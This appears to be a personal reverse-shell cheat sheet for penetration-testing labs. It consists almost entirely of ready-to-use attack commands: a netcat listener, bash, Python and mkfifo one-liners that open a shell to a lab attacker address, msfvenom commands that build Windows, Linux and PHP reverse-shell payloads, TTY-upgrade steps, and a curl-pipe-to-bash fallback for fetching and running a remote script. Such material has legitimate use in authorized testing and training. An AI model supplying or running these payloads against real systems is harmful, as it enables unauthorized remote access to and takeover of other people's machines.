# 📇 Reverse Shell Cheat Sheet

> Scan-only. Full detail + TTY upgrade in [[Shells]]. Set `LHOST=tun0 IP`, `LPORT=443`.

## Listener
```bash
nc -lvnp 443
```
```bash
rlwrap nc -lvnp 443        # better line editing
```

## Linux one-liners
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'
```
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.5",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```
```bash
mkfifo /tmp/f;nc 10.10.14.5 443 </tmp/f|/bin/sh >/tmp/f 2>&1;rm /tmp/f
```

## Windows
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o rev.exe
```
PowerShell (base64 the classic TCP client one-liner; run as `powershell -e <b64>`).

## TTY upgrade (after catching Linux shell)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm
```

## msfvenom quick refs
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f elf -o rev.elf
```
```bash
msfvenom -p php/reverse_php LHOST=tun0 LPORT=443 -f raw -o shell.php
```

## Rules
- LHOST = your **tun0** IP. Try egress ports **443/53/80** if blocked.
- If a one-liner fails, host a script and `curl http://you/s.sh|bash`.
